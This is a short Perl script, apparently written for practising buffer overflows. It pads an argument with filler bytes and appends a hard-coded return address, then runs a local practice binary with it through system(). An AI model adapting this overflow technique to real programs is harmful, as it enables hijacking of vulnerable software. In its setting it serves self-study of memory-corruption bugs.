$arg = "ABABCDABCDABCDABCDABCD";
$arg2 = $arg."'\xb9\x84\x04\x08'";
$cmd = "/home/nscross/practice/c/buffer_overflow/a.out ".$arg2;

#system($cmd);
system($cmd);
